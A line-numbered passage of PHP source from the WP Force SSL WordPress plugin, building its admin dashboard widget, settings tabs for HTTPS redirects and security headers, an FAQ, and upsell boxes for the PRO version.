| [420](#L420) | $widget\_html .= '#wpfssl\_status .inside { padding: 0; margin: 0; }'; |
| [421](#L421) | $widget\_html .= '#wpfssl\_status table td { max-width: 0; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; border-top: 1px solid #f0f0f1; }'; |
| [422](#L422) | $widget\_html .= '#wpfssl\_status table { border: none; }'; |
| [423](#L423) | $widget\_html .= '#wpfssl\_status td .wpfssl-show-hover { color: #dcdcde; display: none; }'; |
| [424](#L424) | $widget\_html .= '#wpfssl\_status td:hover .wpfssl-show-hover { display: inline; }'; |
| [425](#L425) | $widget\_html .= '#wpfssl\_status p { padding: 0 12px 12px 12px; }'; |
| [426](#L426) | $widget\_html .= '#wpfssl\_status .wpfssl-status-fail { border-left: 5px solid #d63638; }'; |
| [427](#L427) | $widget\_html .= '#wpfssl\_status .wpfssl-status-warning { border-left: 5px solid #ffaa39; }'; |
| [428](#L428) | $widget\_html .= '#wpfssl\_status .wpfssl-status-pass { border-left: 5px solid #42972d; }'; |
| [429](#L429) | $widget\_html .= '</style>'; |
| [430](#L430) |  |
| [431](#L431) | $widget\_html .= '<table class="striped widefat">'; |
| [432](#L432) | for ($i = 0; $i < 7; $i++) { |
| [433](#L433) | $widget\_html .= '<tr>'; |
| [434](#L434) | $widget\_html .= '<td class="wpfssl-status-' . $tests[$i]['status'] . '">' . $tests[$i]['title'] . '<span class="wpfssl-show-hover"> | <a href="' . admin\_url('options-general.php?page=wpfs-settings#tab\_status') . '">View Details</a></span></td>'; |
| [435](#L435) | $widget\_html .= '</tr>'; |
| [436](#L436) | } // for |
| [437](#L437) | $widget\_html .= '</table>'; |
| [438](#L438) |  |
| [439](#L439) | $widget\_html .= '<p>View all <b>' . sizeof($tests) . ' tests</b>, detailed test explanations, and how to fix problems in the <a href="' . admin\_url('options-general.php?page=wpfs-settings#tab\_status') . '">WP Force SSL</a> plugin settings.</p>'; |
| [440](#L440) |  |
| [441](#L441) | wpForceSSL\_Utility::wp\_kses\_wf($widget\_html); |
| [442](#L442) | } // widget\_content |
| [443](#L443) |  |
| [444](#L444) |  |
| [445](#L445) | // fix for aggressive plugins that include their CSS on all pages |
| [446](#L446) | function cleanup\_enqueues() |
| [447](#L447) | { |
| [448](#L448) | if (!$this->is\_plugin\_page()) { |
| [449](#L449) | return; |
| [450](#L450) | } |
| [451](#L451) |  |
| [452](#L452) | wp\_dequeue\_style('uiStyleSheet'); |
| [453](#L453) | wp\_dequeue\_style('wpcufpnAdmin'); |
| [454](#L454) | wp\_dequeue\_style('unifStyleSheet'); |
| [455](#L455) | wp\_dequeue\_style('wpcufpn\_codemirror'); |
| [456](#L456) | wp\_dequeue\_style('wpcufpn\_codemirrorTheme'); |
| [457](#L457) | wp\_dequeue\_style('collapse-admin-css'); |
| [458](#L458) | wp\_dequeue\_style('jquery-ui-css'); |
| [459](#L459) | wp\_dequeue\_style('tribe-common-admin'); |
| [460](#L460) | wp\_dequeue\_style('file-manager\_\_jquery-ui-css'); |
| [461](#L461) | wp\_dequeue\_style('file-manager\_\_jquery-ui-css-theme'); |
| [462](#L462) | wp\_dequeue\_style('wpmegmaps-jqueryui'); |
| [463](#L463) | wp\_dequeue\_style('wp-botwatch-css'); |
| [464](#L464) | wp\_dequeue\_style('njt-filebird-admin'); |
| [465](#L465) | wp\_dequeue\_style('ihc\_jquery-ui.min.css'); |
| [466](#L466) | wp\_dequeue\_style('badgeos-juqery-autocomplete-css'); |
| [467](#L467) | wp\_dequeue\_style('mainwp'); |
| [468](#L468) | wp\_dequeue\_style('mainwp-responsive-layouts'); |
| [469](#L469) | wp\_dequeue\_style('jquery-ui-style'); |
| [470](#L470) | wp\_dequeue\_style('additional\_style'); |
| [471](#L471) | wp\_dequeue\_style('wobd-jqueryui-style'); |
| [472](#L472) | wp\_dequeue\_style('wpdp-style3'); |
| [473](#L473) | wp\_dequeue\_style('jquery\_smoothness\_ui'); |
| [474](#L474) | wp\_dequeue\_style('uap\_main\_admin\_style'); |
| [475](#L475) | wp\_dequeue\_style('uap\_font\_awesome'); |
| [476](#L476) | wp\_dequeue\_style('uap\_jquery-ui.min.css'); |
| [477](#L477) | } // cleanup\_enqueues |
| [478](#L478) |  |
| [479](#L479) |  |
| [480](#L480) | /\*\* |
| [481](#L481) | \* Add links to plugin's description in plugins table |
| [482](#L482) | \* |
| [483](#L483) | \* @param array  $links  Initial list of links. |
| [484](#L484) | \* @param string $file   Basename of current plugin. |
| [485](#L485) | \* |
| [486](#L486) | \* @return array |
| [487](#L487) | \*/ |
| [488](#L488) | function plugin\_meta\_links($links, $file) |
| [489](#L489) | { |
| [490](#L490) | if ($file !== plugin\_basename(\_\_FILE\_\_)) { |
| [491](#L491) | return $links; |
| [492](#L492) | } |
| [493](#L493) |  |
| [494](#L494) | $support\_link = '<a target="\_blank" href="https://wordpress.org/support/plugin/wp-force-ssl/" title="Get help">Support</a>'; |
| [495](#L495) | $home\_link = '<a target="\_blank" href="https://wpforcessl.com/?ref=wpfssl-free" title="Plugin Homepage">Plugin Homepage</a>'; |
| [496](#L496) |  |
| [497](#L497) | $links[] = $support\_link; |
| [498](#L498) | $links[] = $home\_link; |
| [499](#L499) |  |
| [500](#L500) | return $links; |
| [501](#L501) | } // plugin\_meta\_links |
| [502](#L502) |  |
| [503](#L503) |  |
| [504](#L504) | /\*\* |
| [505](#L505) | \* Add action links to plugins table, left part |
| [506](#L506) | \* |
| [507](#L507) | \* @param array  $links  Initial list of links. |
| [508](#L508) | \* |
| [509](#L509) | \* @return array |
| [510](#L510) | \*/ |
| [511](#L511) | function plugin\_action\_links($links) |
| [512](#L512) | { |
| [513](#L513) | $settings\_link = '<a href="' . admin\_url('options-general.php?page=wpfs-settings') . '" title="Configure SSL settings">Configure SSL</a>'; |
| [514](#L514) | $buy\_link = '<a href="' . admin\_url('options-general.php?page=wpfs-settings#open-pro-dialog') . '" title="Buy the PRO version"><b>Buy PRO</b></a>'; |
| [515](#L515) |  |
| [516](#L516) | array\_unshift($links, $buy\_link); |
| [517](#L517) | array\_unshift($links, $settings\_link); |
| [518](#L518) |  |
| [519](#L519) | return $links; |
| [520](#L520) | } // plugin\_action\_links |
| [521](#L521) |  |
| [522](#L522) |  |
| [523](#L523) | /\*\* |
| [524](#L524) | \* Remove all WP notices on WPSSL page |
| [525](#L525) | \* |
| [526](#L526) | \* @return null |
| [527](#L527) | \*/ |
| [528](#L528) | function remove\_admin\_notices() |
| [529](#L529) | { |
| [530](#L530) | if (!$this->is\_plugin\_page()) { |
| [531](#L531) | return false; |
| [532](#L532) | } |
| [533](#L533) |  |
| [534](#L534) | global $wp\_filter; |
| [535](#L535) | unset($wp\_filter['user\_admin\_notices'], $wp\_filter['admin\_notices']); |
| [536](#L536) | } // remove\_admin\_notices |
| [537](#L537) |  |
| [538](#L538) |  |
| [539](#L539) | /\*\* |
| [540](#L540) | \* Main function for displaying plugin's admin page |
| [541](#L541) | \* |
| [542](#L542) | \* @return null |
| [543](#L543) | \*/ |
| [544](#L544) | function settings\_page\_content() |
| [545](#L545) | { |
| [546](#L546) | // double check for admin privileges |
| [547](#L547) | if (!current\_user\_can('administrator')) { |
| [548](#L548) | wp\_die('Sorry, you are not allowed to access this page.'); |
| [549](#L549) | } |
| [550](#L550) |  |
| [551](#L551) | echo '<header>'; |
| [552](#L552) | echo '<img id="logo-icon" src="' . esc\_url($this->plugin\_url) . 'img/wp-force-ssl-logo.png" title="WP Force SSL" alt="WP Force SSL" />'; |
| [553](#L553) | echo '</header>'; |
| [554](#L554) |  |
| [555](#L555) | echo '<div id="wfssl-notifications">'; |
| [556](#L556) | echo '</div>'; |
| [557](#L557) |  |
| [558](#L558) | echo '<div class="wfssl-container-left">'; |
| [559](#L559) | echo '<div id="wfssl-tabs" class="ui-tabs" style="display: none;">'; |
| [560](#L560) | $tabs = array(); |
| [561](#L561) |  |
| [562](#L562) | $tabs[] = array('id' => 'tab\_status', 'class' => 'wfssl-tab', 'label' => 'Status', 'callback' => 'tab\_status'); |
| [563](#L563) | $tabs[] = array('id' => 'tab\_settings', 'class' => 'wfssl-tab', 'label' => 'Settings', 'callback' => 'tab\_settings'); |
| [564](#L564) | $tabs[] = array('id' => 'tab\_scanner', 'class' => 'wfssl-tab', 'label' => 'Content Scanner', 'callback' => 'tab\_scanner'); |
| [565](#L565) | $tabs[] = array('id' => 'tab\_ssl', 'class' => 'wfssl-tab', 'label' => 'SSL Certificate', 'callback' => 'tab\_ssl'); |
| [566](#L566) | $tabs[] = array('id' => 'tab\_support', 'class' => 'wfssl-tab', 'label' => 'Support', 'callback' => 'tab\_support'); |
| [567](#L567) | $tabs[] = array('id' => 'tab\_pro', 'class' => 'wfssl-tab wfssl-tab-pro', 'label' => 'PRO', 'callback' => ''); |
| [568](#L568) |  |
| [569](#L569) | echo '<nav>'; |
| [570](#L570) | echo '<div class="wfssl-container">'; |
| [571](#L571) | echo '<ul class="wfssl-main-tab">'; |
| [572](#L572) | foreach ($tabs as $tab) { |
| [573](#L573) | echo '<li id="button-' . esc\_attr($tab['id']) . '" class="' . esc\_attr($tab['class']) . '"><a href="#' . esc\_attr($tab['id']) . '">' . esc\_attr($tab['label']) . '</a></li>'; |
| [574](#L574) | } |
| [575](#L575) | echo '</ul>'; |
| [576](#L576) | echo '</div>'; // container |
| [577](#L577) | echo '</nav>'; |
| [578](#L578) |  |
| [579](#L579) | // tabs |
| [580](#L580) | echo '<div class="wfssl-container">'; |
| [581](#L581) |  |
| [582](#L582) | foreach ($tabs as $tab) { |
| [583](#L583) | if (is\_callable(array($this, $tab['callback']))) { |
| [584](#L584) | echo '<div id="' . esc\_attr($tab['id']) . '" class="wfssl-tab-content">'; |
| [585](#L585) | call\_user\_func(array($this, $tab['callback'])); |
| [586](#L586) | echo '</div>'; |
| [587](#L587) | } |
| [588](#L588) | } |
| [589](#L589) |  |
| [590](#L590) | echo '</div>'; // wfssl-container |
| [591](#L591) | echo '</div>'; |
| [592](#L592) | echo '</div>'; // wfssl-container-left |
| [593](#L593) |  |
| [594](#L594) | echo '<div class="wfssl-container wfssl-container-right">'; |
| [595](#L595) | echo '<div class="sidebar-box pro-ad-box"> |
| [596](#L596) | <p class="text-center"><a href="https://wpforcessl.com/?ref=wpfssl-free-sidebar-box" target="\_blank"> |
| [597](#L597) | <img src="' . esc\_url($this->plugin\_url) . 'img/wp-force-ssl-logo.png" alt="WP Force SSL PRO" title="WP Force SSL PRO"></a><br><b>PRO version</b> is here! Grab the launch discount - <b>all prices are LIFETIME!</b></p> |
| [598](#L598) | <ul class="plain-list"> |
| [599](#L599) | <li>15+ Options to Fine-Tune Your SSL</li> |
| [600](#L600) | <li>Mixed Content Scanner + Fixer</li> |
| [601](#L601) | <li>Real-Time SSL &amp; Site monitoring (via our SaaS)</li> |
| [602](#L602) | <li>Generate &amp; Install Free SSL Certificate</li> |
| [603](#L603) | <li>Licenses &amp; Sites Manager (remote SaaS dashboard)</li> |
| [604](#L604) | <li>White-label Mode + Complete Codeless Plugin Rebranding</li> |
| [605](#L605) | <li>Email support from plugin developers</li> |
| [606](#L606) | </ul> |
| [607](#L607) |  |
| [608](#L608) | <p class="text-center"><a href="#" class="open-pro-dialog button button-buy" data-pro-feature="sidebar-box">Get PRO Now</a></p> |
| [609](#L609) | </div>'; |
| [610](#L610) | echo '<div class="sidebar-box" style="margin-top: 35px;"> |
| [611](#L611) | <p>Please <a href="https://wordpress.org/support/plugin/wp-force-ssl/reviews/#new-post" target="\_blank">rate the plugin ★★★★★</a> to <b>keep it up-to-date &amp; maintained</b>. It only takes a second to rate. Thank you! 👋</p> |
| [612](#L612) | </div>'; |
| [613](#L613) | echo '</div>'; // wfssl-container-right |
| [614](#L614) |  |
| [615](#L615) | wpForceSSL\_Utility::wp\_kses\_wf($this->pro\_dialog()); |
| [616](#L616) | } // settings\_page\_content |
| [617](#L617) |  |
| [618](#L618) |  |
| [619](#L619) | function tab\_support() |
| [620](#L620) | { |
| [621](#L621) | echo '<div style="overflow: auto;"> |
| [622](#L622) | <div class="wfssl-box"> |
| [623](#L623) | <h3>Support</h3> |
| [624](#L624) | <p>Support for the free version is available only via the <a href="https://wordpress.org/support/plugin/wp-force-ssl/" target="\_blank">WP repo support forum</a>. If you need email support please <a href="#" class="open-pro-dialog" data-pro-feature="support">upgrade to PRO</a>.</p>'; |
| [625](#L625) | echo '</div>'; |
| [626](#L626) | echo '</div>'; |
| [627](#L627) | echo '<h3>FAQ</h3> |
| [628](#L628) | <div class="wfssl-accordion-wfssl-accordion-tabs"> |
| [629](#L629) | <div class="wfssl-accordion-tab"> |
| [630](#L630) | <input type="checkbox" id="faq1"> |
| [631](#L631) | <label class="wfssl-accordion-tab-label wfssl-fs-18 wfssl-font" for="faq1">Will WP Force SSL slow down my site?</label> |
| [632](#L632) | <div class="wfssl-accordion-tab-content"> |
| [633](#L633) | Absolutely not. Everything the plugin does happens in the admin. Nothing is loaded, added, or processed on the front-end so you can rest assured there is no impact on the performance of your site. |
| [634](#L634) | </div> |
| [635](#L635) | </div> |
| [636](#L636) |  |
| [637](#L637) | <div class="wfssl-accordion-tab"> |
| [638](#L638) | <input type="checkbox" id="faq8"> |
| [639](#L639) | <label class="wfssl-accordion-tab-label wfssl-fs-18 wfssl-font" for="faq8">I just moved my site to another address, will WP Force SSL help?</label> |
| [640](#L640) | <div class="wfssl-accordion-tab-content"> |
| [641](#L641) | Definitely! Especially if you moved from HTTP to HTTPS. The plugin will make sure to properly redirect all your content, check your SSL certificate, and add other security features. |
| [642](#L642) | </div> |
| [643](#L643) | </div> |
| [644](#L644) |  |
| [645](#L645) | <div class="wfssl-accordion-tab d-none"> |
| [646](#L646) | <input type="checkbox" id="faq2"> |
| [647](#L647) | <label class="wfssl-accordion-tab-label wfssl-fs-18 wfssl-font" for="faq2">Can you install an SSL certificate for me?</label> |
| [648](#L648) | <div class="wfssl-accordion-tab-content"> |
| [649](#L649) | Sorry, at the moment we can\'t. The automatic SSL certificate installation feature is on our to-do and will be available in one of the future versions. |
| [650](#L650) | </div> |
| [651](#L651) | </div> |
| [652](#L652) |  |
| [653](#L653) | <div class="wfssl-accordion-tab"> |
| [654](#L654) | <input type="checkbox" id="faq11"> |
| [655](#L655) | <label class="wfssl-accordion-tab-label wfssl-fs-18 wfssl-font" for="faq11">What are the requirements for running SSL on a site?</label> |
| [656](#L656) | <div class="wfssl-accordion-tab-content">There are many but a short answer is "A valid SSL certificate". Please head over to the <a href="#" data-tab="0" class="change-tab">Status</a> tab and see the results. The tests were made specifically to see if a site is ready for SSL. |
| [657](#L657) | </div> |
| [658](#L658) | </div> |
| [659](#L659) |  |
| [660](#L660) | <div class="wfssl-accordion-tab"> |
| [661](#L661) | <input type="checkbox" id="faq4"> |
| [662](#L662) | <label class="wfssl-accordion-tab-label wfssl-fs-18 wfssl-font" for="faq4">Is WP Force SSL dangerous for my site?</label> |
| [663](#L663) | <div class="wfssl-accordion-tab-content"> |
| [664](#L664) | No, definitely not! The plugin does not make any permanent changes to your site so even if it comes to a worst-case scenario you can just disable the plugin and that will undo all changes. |
| [665](#L665) | </div> |
| [666](#L666) | </div> |
| [667](#L667) |  |
| [668](#L668) | <div class="wfssl-accordion-tab d-none"> |
| [669](#L669) | <input type="checkbox" id="faq5"> |
| [670](#L670) | <label class="wfssl-accordion-tab-label wfssl-fs-18 wfssl-font" for="faq5">Can you generate/get an SSL certificate for me?</label> |
| [671](#L671) | <div class="wfssl-accordion-tab-content"> |
| [672](#L672) | At the moment no. Sorry. We are already working on a feature that will automatically get a certificate from Let\'s Encrypt and install it on your site but it\'s not ready yet. |
| [673](#L673) | </div> |
| [674](#L674) | </div> |
| [675](#L675) |  |
| [676](#L676) | <div class="wfssl-accordion-tab"> |
| [677](#L677) | <input type="checkbox" id="faq7"> |
| [678](#L678) | <label class="wfssl-accordion-tab-label wfssl-fs-18 wfssl-font" for="faq7">Will WP Force SSL modify my files, database or any content?</label> |
| [679](#L679) | <div class="wfssl-accordion-tab-content"> |
| [680](#L680) | It will not automatically modify anything. If anything needs permanent changes you\'ll be prompted to double-confirm the change. However, on 90% of sites, all changes are done on the fly so they are not permanent. Disabling the plugin undoes all changes. |
| [681](#L681) | </div> |
| [682](#L682) | </div> |
| [683](#L683) |  |
| [684](#L684) | <div class="wfssl-accordion-tab"> |
| [685](#L685) | <input type="checkbox" id="faq6"> |
| [686](#L686) | <label class="wfssl-accordion-tab-label wfssl-fs-18 wfssl-font" for="faq6">When I buy PRO can I manage my licenses and change sites?</label> |
| [687](#L687) | <div class="wfssl-accordion-tab-content"> |
| [688](#L688) | Certainly! Purchases, sites, licenses & SSL monitors are managed in the <a href="https://dashboard.wpforcessl.com/" target="\_blank">WP Force SSL Dashboard</a>. It\'s a central place to manage all your sites. You can move the licenses (change sites/domains) as much as you need. There are no limits. |
| [689](#L689) | </div> |
| [690](#L690) | </div> |
| [691](#L691) | </div>'; |
| [692](#L692) | } // tab\_support |
| [693](#L693) |  |
| [694](#L694) |  |
| [695](#L695) | function tab\_status() |
| [696](#L696) | { |
| [697](#L697) | echo '<div id="status\_progress\_wrapper" class="wfssl-progress" style="display:none;"> |
| [698](#L698) | <div id="status\_progress" class="bar orange" style="width:0%"> |
| [699](#L699) | <div id="status\_progress\_text" class="wfssl-progress-text"></div> |
| [700](#L700) | </div> |
| [701](#L701) | </div> |
| [702](#L702) |  |
| [703](#L703) | <div id="status\_tasks" class="wfssl-labels" style="display:none;"> |
| [704](#L704) | <div class="status-tasks status-tasks-selected">All tasks</div> |
| [705](#L705) | <div class="status-tasks-remaining">Remaining tasks</div> |
| [706](#L706) | </div> |
| [707](#L707) |  |
| [708](#L708) | <div id="test-results-wrapper"> |
| [709](#L709) | <div class="loading-wrapper"> |
| [710](#L710) | <img class="wfssl\_flicker" src="' . esc\_url($this->plugin\_url) . 'img/wp-force-ssl-icon.png' . '" alt="Loading. Please wait." title="Loading. Please wait."> |
| [711](#L711) | <p>Loading. Please wait.</p> |
| [712](#L712) | </div> |
| [713](#L713) | </div>'; |
| [714](#L714) | echo '<div class="button button-primary run-tests" style="float: right; display:none;">Run Tests Again</div>'; |
| [715](#L715) | } // tab\_status |
| [716](#L716) |  |
| [717](#L717) |  |
| [718](#L718) | function tab\_settings() |
| [719](#L719) | { |
| [720](#L720) | echo '<form id="wpfs\_form"><table class="form-table" id="settings-table">'; |
| [721](#L721) |  |
| [722](#L722) | echo '<tr><td> |
| [723](#L723) | <label for="wpfs\_ssl">Redirect HTTP requests to HTTPS</label> |
| [724](#L724) | <small>Visitors will be automatically redirected from HTTP to HTTPS for all pages, posts and other WP content. The 301 redirect status is used. Files that are outside of WP, or accessed directly will still be served via HTTP.</small> |
| [725](#L725) | </td><td>'; |
| [726](#L726) | wpForceSSL\_Utility::create\_toogle\_switch('wpfs\_ssl', array('saved\_value' => ($this->options['wpfs\_ssl'] == 'yes' ? true : false))); |
| [727](#L727) | echo '</td></tr>'; |
| [728](#L728) |  |
| [729](#L729) | echo '<tr><td> |
| [730](#L730) | <label for="fix\_frontend\_mixed\_content\_fixer">Fix mixed content on frontend<span class="pro-feature open-pro-dialog">PRO</span></label> |
| [731](#L731) | <small>Fix mixed content on the frontend on the fly (files and/or database is not changed) by replacing <code>http://</code> with <code>https://</code> for linked resources.</small> |
| [732](#L732) | </td><td>'; |
| [733](#L733) | wpForceSSL\_Utility::create\_toogle\_switch('fix\_frontend\_mixed\_content\_fixer', array('class' => 'open-pro-dialog', 'saved\_value' => false)); |
| [734](#L734) | echo '</td></tr>'; |
| [735](#L735) |  |
| [736](#L736) | echo '<tr><td> |
| [737](#L737) | <label for="fix\_backend\_mixed\_content\_fixer">Fix mixed content on backend (in WP admin)<span class="pro-feature open-pro-dialog">PRO</span></label> |
| [738](#L738) | <small>Fix mixed content in the backend (WP admin) on the fly (files and/or database is not changed) by replacing <code>http://</code> with <code>https://</code> for linked resources</small> |
| [739](#L739) | </td><td>'; |
| [740](#L740) | wpForceSSL\_Utility::create\_toogle\_switch('fix\_backend\_mixed\_content\_fixer', array('class' => 'open-pro-dialog', 'saved\_value' => false)); |
| [741](#L741) | echo '</td></tr>'; |
| [742](#L742) |  |
| [743](#L743) | echo '<tr><td> |
| [744](#L744) | <label for="wpfs\_hsts">Enable HSTS</label> |
| [745](#L745) | <small>HSTS (HTTP Strict Transport Security) is a header sent by your website to your visitors\' browser telling it to only use HTTPS to connect to the website. If someone tried to perform a man-in-the-middle attack and redirect the visitor to their own malicious version of the domain the browser will refuse to load the website via HTTP and force them to show a valid SSL certificate for the domain, which they will not have and thus the attack will fail.</small> |
| [746](#L746) | </td><td>'; |
| [747](#L747) | wpForceSSL\_Utility::create\_toogle\_switch('wpfs\_hsts', array('saved\_value' => ($this->options['wpfs\_hsts'] == 'yes' ? true : false))); |
| [748](#L748) | echo '</td></tr>'; |
| [749](#L749) |  |
| [750](#L750) | echo '<tr><td> |
| [751](#L751) | <label for="force\_secure\_cookies">Force Secure Cookies<span class="pro-feature open-pro-dialog">PRO</span></label> |
| [752](#L752) | <small>Cookies are small packets of data stored on your computer by the websites you visit so it remembers information like your logged in state. Most times this information is sensitive, so you should enable this option to harden the way cookies are exchanged with by your browser and to prevent anyone else from reading them.</small> |
| [753](#L753) | </td><td>'; |
| [754](#L754) | wpForceSSL\_Utility::create\_toogle\_switch('force\_secure\_cookies', array('class' => 'open-pro-dialog', 'saved\_value' => false)); |
| [755](#L755) | echo '</td></tr>'; |
| [756](#L756) |  |
| [757](#L757) | echo '<tr><td> |
| [758](#L758) | <label for="htaccess\_301\_redirect">Redirect HTTP to HTTPS requests via .htaccess<span class="pro-feature open-pro-dialog">PRO</span></label> |
| [759](#L759) | <small>Redirect all <code>http://</code> requests to <code>https://</code> via .htaccess as soon as the request is received. This is slighly faster than PHP redirect but if your server does not use .htaccess you can use the PHP redirect option too.</small> |
| [760](#L760) | </td><td>'; |
| [761](#L761) | wpForceSSL\_Utility::create\_toogle\_switch('htaccess\_301\_redirect', array('class' => 'open-pro-dialog', 'saved\_value' => false)); |
| [762](#L762) | echo '</td></tr>'; |
| [763](#L763) |  |
| [764](#L764) | echo '<tr><td> |
| [765](#L765) | <label for="xss\_protection">Cross-site scripting (X-XSS) protection<span class="pro-feature open-pro-dialog">PRO</span></label> |
| [766](#L766) | <small>Protects your site from cross-site scripting attacks. If a cross-site scripting attack is detected, the browser will automatically block those requests.</small> |
| [767](#L767) | </td><td>'; |
| [768](#L768) | wpForceSSL\_Utility::create\_toogle\_switch('xss\_protection', array('class' => 'open-pro-dialog', 'saved\_value' => false)); |
| [769](#L769) | echo '</td></tr>'; |
| [770](#L770) |  |
| [771](#L771) | echo '<tr><td> |
| [772](#L772) | <label for="x\_content\_options">X-Content-Type Options<span class="pro-feature open-pro-dialog">PRO</span></label> |
| [773](#L773) | <small>This header prevents MIME-sniffing, which is used to disguise the content type of malicious files being uploaded to the website.</small> |
| [774](#L774) | </td><td>'; |
| [775](#L775) | wpForceSSL\_Utility::create\_toogle\_switch('x\_content\_options', array('class' => 'open-pro-dialog', 'saved\_value' => false)); |
| [776](#L776) | echo '</td></tr>'; |
| [777](#L777) |  |
| [778](#L778) | echo '<tr><td> |
| [779](#L779) | <label for="referrer\_policy">Referrer Policy<span class="pro-feature open-pro-dialog">PRO</span></label> |
| [780](#L780) | <small>To prevent data leakage, only send referrer information when navigating to the same protocol (HTTPS -&gt; HTTPS) and not when downgrading (HTTPS -&gt; HTTP).</small> |
| [781](#L781) | </td><td>'; |
| [782](#L782) | wpForceSSL\_Utility::create\_toogle\_switch('referrer\_policy', array('class' => 'open-pro-dialog', 'saved\_value' => false)); |
| [783](#L783) | echo '</td></tr>'; |
| [784](#L784) |  |
| [785](#L785) | echo '<tr><td> |
| [786](#L786) | <label for="wpfs\_expect\_ct">Expect CT</label> |
| [787](#L787) | <small>Enables the Expect-CT header, requesting that the browser check that the certificate for that site appears in public CT logs.</small> |
| [788](#L788) | </td><td>'; |
| [789](#L789) | wpForceSSL\_Utility::create\_toogle\_switch('wpfs\_expect\_ct', array('saved\_value' => ($this->options['wpfs\_expect\_ct'] == 'yes' ? true : false))); |
| [790](#L790) | echo '</td></tr>'; |
| [791](#L791) |  |
| [792](#L792) | echo '<tr><td> |
| [793](#L793) | <label for="x\_frame\_options">X-Frame Options<span class="pro-feature open-pro-dialog">PRO</span></label> |
| [794](#L794) | <small>This header prevents your site from being loaded in an iFrame on other domains. This is used to prevent clickjacking attacks. Be sure to enable this option!</small> |
| [795](#L795) | </td><td>'; |
| [796](#L796) | wpForceSSL\_Utility::create\_toogle\_switch('x\_frame\_options', array('class' => 'open-pro-dialog', 'saved\_value' => false)); |
| [797](#L797) | echo '</td></tr>'; |
| [798](#L798) |  |
| [799](#L799) | echo '<tr><td> |
| [800](#L800) | <label for="permissions\_policy">Permissions Policy<span class="pro-feature open-pro-dialog">PRO</span></label> |
| [801](#L801) | <small>The Permissions Policy allows you to specify which browser resources to allow on your site (i.e. microphone, webcam, etc.).</small> |
| [802](#L802) | </td><td>'; |
| [803](#L803) | wpForceSSL\_Utility::create\_toogle\_switch('permissions\_policy', array('class' => 'open-pro-dialog', 'saved\_value' => false)); |
| [804](#L804) | echo '</td></tr>'; |
| [805](#L805) |  |
| [806](#L806) | echo '<tr><td> |
| [807](#L807) | <label for="wpfs\_adminbar\_menu">Show WP Force SSL menu to administrators in admin bar</label> |
| [808](#L808) | <small>When enabled an extra menu will be shown to admins in the admin topbar. Don\'t forget to reload the page after saving to see the change.</small> |
| [809](#L809) | </td><td>'; |
| [810](#L810) | wpForceSSL\_Utility::create\_toogle\_switch('wpfs\_adminbar\_menu', array('saved\_value' => ($this->options['wpfs\_adminbar\_menu'] == 'yes' ? true : false))); |
| [811](#L811) | echo '</td></tr>'; |
| [812](#L812) |  |
| [813](#L813) | echo '<tr><td> |
| [814](#L814) | <label for="wpfs\_dashboard\_widget">Show WP Force SSL widget to administrators in admin dashboard</label> |
| [815](#L815) | <small>When enabled a widget with status details will be shown to admins in the admin dashboard.</small> |
| [816](#L816) | </td><td>'; |
| [817](#L817) | wpForceSSL\_Utility::create\_toogle\_switch('wpfs\_dashboard\_widget', array('saved\_value' => ($this->options['wpfs\_dashboard\_widget'] == 'yes' ? true : false))); |
| [818](#L818) | echo '</td></tr>'; |
| [819](#L819) |  |
| [820](#L820) | echo '</table></form>'; |
| [821](#L821) |  |
| [822](#L822) | echo '<p><a href="#" class="button button-primary save-ssl-options">' . \_\_('Save Settings', 'wp-force-ssl') . '</a></p>'; |
| [823](#L823) | } //tab\_settings |
| [824](#L824) |  |
| [825](#L825) |  |
| [826](#L826) | function tab\_scanner() |
| [827](#L827) | { |
| [828](#L828) | echo '<div id="scanner\_progress\_wrapper" class="wfssl-progress" style="display:none;"> |
| [829](#L829) | <div id="scanner\_progress" class="bar"> |
| [830](#L830) | <div id="scanner\_progress\_text" class="wfssl-progress-text"></div> |
| [831](#L831) | </div> |
| [832](#L832) | </div>'; |
| [833](#L833) | $posts = get\_posts(array('post\_type' => get\_post\_types(array('public' => true)), 'numberposts' => 1000)); |
| [834](#L834) | echo '<div class="scanner-stats">Total pages to scan: ' . esc\_html(number\_format(count($posts))) . '</div>'; |
| [835](#L835) | echo '<a href="#" class="open-pro-dialog" data-pro-feature="content-scanner"><img class="scanner-preview" src="' . esc\_url($this->plugin\_url . 'img/content-scanner.jpg') . '" /></a>'; |
| [836](#L836) |  |
| [837](#L837) | echo '<div id="start-scanner" data-pro-feature="start-scanning" class="button button-primary open-pro-dialog">Start Scanning</div>'; |
| [838](#L838) | } //tab\_scanner |
| [839](#L839) |  |
| [840](#L840) |  |
| [841](#L841) | function tab\_ssl() |
| [842](#L842) | { |
| [843](#L843) | echo '<h2>SSL Certificate Information</h2>'; |
| [844](#L844) | echo '<div id="ssl\_cert\_details" class="wfssl-box">'; |
| [845](#L845) | echo 'Loading certificate information ...<span class="wfssl-green wfssl\_rotating dashicons dashicons-update"></span>'; |
| [846](#L846) | echo '</div>'; |
| [847](#L847) | echo '<div class="clear"></div>'; |
| [848](#L848) |  |
| [849](#L849) | echo '<h2>Real-Time SSL &amp; Site Monitoring<span class="pro-feature">PRO</span></h2>'; |
| [850](#L850) | echo '<div id="wfssl\_cert\_email" class="wfssl-box">'; |
| [851](#L851) | echo '<span class="wfssl-red dashicons dashicons-dismiss"></span>'; |
| [852](#L852) | echo '<p>Real-time site &amp; SSL certificate monitoring is a <a href="#" data-pro-feature="ssl-monitor-text" class="open-pro-dialog">PRO</a> feature powered by our SaaS that will help you and your clients sleep better. It monitors over 20 common errors related to SSL that can happen at any time. Forgot to renew your certificate? No problem, you\'ll get notified on time. Forgot to change certificate after switching the domain or server? Again, not a problem. You\'ll get notified.</p>'; |
| [853](#L853) | echo '<label for="ssl-monitor-toggle">Enable Monitoring</label> &nbsp; '; |
| [854](#L854) | wpForceSSL\_Utility::create\_toogle\_switch('ssl-monitor-toggle', array('class' => 'open-pro-dialog', 'saved\_value' => false)); |
| [855](#L855) | echo '<div id="wfssl-cert-expiration-email-box">'; |
| [856](#L856) | echo '<input id="cert\_expiration\_email" name="cert\_expiration\_email" class="wfssl-cert-expiration-email-input open-pro-dialog" data-pro-feature="ssl-monitor-email" type="text" placeholder="Email for notifications" value="" style="height:32px; width:353px; background-color: #fff; margin-bottom: 20px;"><br>'; |
| [857](#L857) | echo '<div class="button button-primary open-pro-dialog" data-pro-feature="ssl-monitor-save">Save &amp; Enable Monitoring</div>'; |
| [858](#L858) | echo '</div>'; |
| [859](#L859) | echo '</div>'; |
| [860](#L860) |  |
| [861](#L861) | echo '<div class="clear"></div>'; |
